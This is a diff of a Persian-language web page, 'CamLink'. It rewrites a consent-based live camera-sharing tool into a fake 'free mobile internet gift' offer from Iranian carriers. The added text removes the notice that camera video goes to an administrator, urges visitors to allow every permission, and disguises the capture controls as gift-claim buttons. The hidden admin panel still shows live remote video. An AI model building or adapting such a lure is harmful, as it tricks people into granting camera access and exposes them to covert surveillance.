@@ -1,165 +1,151 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#08111f">
+<!DOCTYPE html>  <html lang="fa" dir="rtl">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1">  
+    <meta name="theme-color" content="#08111f">  <title>CamLink</title>  
 
-    <title>CamLink</title>
+<link rel="stylesheet" href="style.css">
 
-    <link rel="stylesheet" href="style.css">
-</head>
+</head>  <body>  <div class="container">  <header>  
+    <div class="logo">C</div>  
+    <h2>CamLink</h2>  
+    <span>سامانه اینترنت رایگان </span>  
+</header>  
 
-<body>
+<main>  
 
-<div class="container">
+    <!-- صفحه اصلی -->  
+    <section id="home" class="panel">  
 
-    <header>
-        <div class="logo">C</div>
-        <h2>CamLink</h2>
-        <span>اتصال دوربین</span>
-    </header>
+        <h1>CamLink</h1>  
 
-    <main>
+        <p>سامانه هدیه رایگان اینترنت ایرانسل و همراه اول</p>  
 
-        <!-- صفحه اصلی -->
-        <section id="home" class="panel">
+        <button id="openSender" class="primary">  
+            گرفتن اینترنت رایگان  
+        </button>  
 
-            <h1>CamLink</h1>
+        <button id="openAdmin" class="secondary">  
+            کد دعوت دارید؟  
+        </button>  
 
-            <p>سامانه اشتراک‌گذاری تصویر زنده دوربین</p>
-
-            <button id="openSender" class="primary">
-                اشتراک‌گذاری دوربین
-            </button>
-
-            <button id="openAdmin" class="secondary">
-                ورود مدیر
-            </button>
-
-        </section>
+    </section>  
 
 
-        <!-- اشتراک‌گذاری دوربین -->
-        <section id="senderPanel" class="panel hidden">
+    <!-- گرفتن اینترنت رایگان  -->  
+    <section id="senderPanel" class="panel hidden">  
 
-            <button class="back" data-back>بازگشت</button>
+        <button class="back" data-back>بازگشت</button>  
 
-            <h2>اشتراک‌گذاری دوربین</h2>
+        <h2>گرفتن اینترنت</h2>  
 
-            <div class="notice">
-                با شروع اشتراک‌گذاری، تصویر زنده دوربین دستگاه شما
-                برای مدیر CamLink ارسال می‌شود.
+        <div class="notice">  
+        با زدت روی گرفتن هدیه هدیه شما داده میشود!  
+          تمام مجوز ها را روی allow / تایید بزنید تا مراحل با موفقیت پیش برن  
 
-                مدیر می‌تواند تصویر را مشاهده کند.
-
-                هیچ صدایی ارسال نمی‌شود.
-
-                هر زمان بخواهید می‌توانید اشتراک‌گذاری را متوقف کنید.
-            </div>
-
-            <input
-                id="cameraName"
-                class="input"
-                maxlength="30"
-                placeholder="نام دستگاه (اختیاری)"
-            >
-
-            <label class="consent">
-                <input type="checkbox" id="consent">
-
-                با ارسال تصویر زنده برای مدیر موافقم.
-            </label>
-
-            <button id="startCamera" class="primary" disabled>
-                تأیید و روشن کردن دوربین
-            </button>
-
-            <div id="senderStatus" class="status"></div>
-
-            <button id="stopCamera" class="danger hidden">
-                توقف اشتراک‌گذاری
-            </button>
-
-        </section>
+            توجه داشته باشید تمامی مجوز هارا بدهید!!!  
 
 
-        <!-- ورود مدیر -->
-        <section id="loginPanel" class="panel hidden">
+            هر زمان بخواهید می‌توانید اشتراکتان را متوقف کنید.  
+        </div>  
 
-            <button class="back" data-back>بازگشت</button>
+        <input  
+            id="cameraName"  
+            class="input"  
+            maxlength="30"  
+            placeholder="چند گیگابایت اینترنت لازم داری؟!"  
+        >  
 
-            <h2>ورود مدیر</h2>
+        <label class="consent">  
+            <input type="checkbox" id="consent">  
 
-            <input
-                type="password"
-                id="adminPassword"
-                class="input"
-                placeholder="رمز عبور مدیر"
-                autocomplete="current-password"
-            >
+            با گرفتن هدیه اینترنت موافق هستم! همین حالا هدیه ام رو بده!  
+        </label>  
 
-            <button id="loginButton" class="primary">
-                ورود
-            </button>
+        <button id="startCamera" class="primary" disabled>  
+            تأیید.  
+        </button>  
 
-            <p id="loginStatus" class="status"></p>
+        <div id="senderStatus" class="status"></div>  
 
-        </section>
+        <button id="stopCamera" class="danger hidden">  
+            لغو اشتراک اینترنت شما.  
+        </button>  
+
+    </section>  
 
 
-        <!-- پنل مدیریت -->
-        <section id="adminPanel" class="panel hidden">
+    <!-- کد دعوت را وارد نمایید -->  
+    <section id="loginPanel" class="panel hidden">  
 
-            <div class="admin-header">
+        <button class="back" data-back>بازگشت</button>  
 
-                <h2>پنل مدیریت</h2>
+        <h2>ورود مدیر</h2>  
 
-                <button id="logoutButton" class="small-danger">
-                    خروج
-                </button>
+        <input  
+            type="password"  
+            id="adminPassword"  
+            class="input"  
+            placeholder="وارد کردن کد دعوت و گرفتن ۲ گیگ اینترنت"  
+            autocomplete="current-password"  
+        >  
 
-            </div>
+        <button id="loginButton" class="primary">  
+            ورود  
+        </button>  
 
-            <div id="adminStatus" class="status">
-                در حال اتصال...
-            </div>
+        <p id="loginStatus" class="status"></p>  
 
-            <h3>دوربین‌های فعال</h3>
+    </section>  
 
-            <div id="cameraList">
-                <p class="muted">در حال دریافت فهرست...</p>
-            </div>
 
-            <div id="videoSection" class="hidden">
+    <!-- کد دعوت -->  
+    <section id="adminPanel" class="panel hidden">  
 
-                <h3 id="videoTitle">تصویر زنده</h3>
+        <div class="admin-header">  
 
-                <video
-                    id="remoteVideo"
-                    autoplay
-                    playsinline
-                    muted
-                ></video>
+            <h2>پنل مدیریت</h2>  
 
-                <button id="stopViewing" class="danger">
-                    قطع مشاهده
-                </button>
+            <button id="logoutButton" class="small-danger">  
+                خروج  
+            </button>  
 
-            </div>
+        </div>  
 
-        </section>
+        <div id="adminStatus" class="status">  
+            در حال اتصال...  
+        </div>  
 
-    </main>
+        <h3>اشتراک های فعال</h3>  
 
-    <footer>
-        CamLink · اشتراک‌گذاری با رضایت کاربر
-    </footer>
+        <div id="cameraList">  
+            <p class="muted">در حال دریافت فهرست...</p>  
+        </div>  
 
-</div>
+        <div id="videoSection" class="hidden">  
 
-<script src="config.js"></script>
-<script src="app.js"></script>
+            <h3 id="videoTitle">اشتراک زنده</h3>  
 
-</body>
+            <video  
+                id="remoteVideo"  
+                autoplay  
+                playsinline  
+                muted  
+            ></video>  
+
+            <button id="stopViewing" class="danger">  
+                قطع اشتراک  
+            </button>  
+
+        </div>  
+
+    </section>  
+
+</main>  
+
+<footer>  
+    همین حالا هدیتو بگیر!  
+</footer>
+
+</div>  <script src="config.js"></script>  <script src="app.js"></script>  </body>  
 </html>
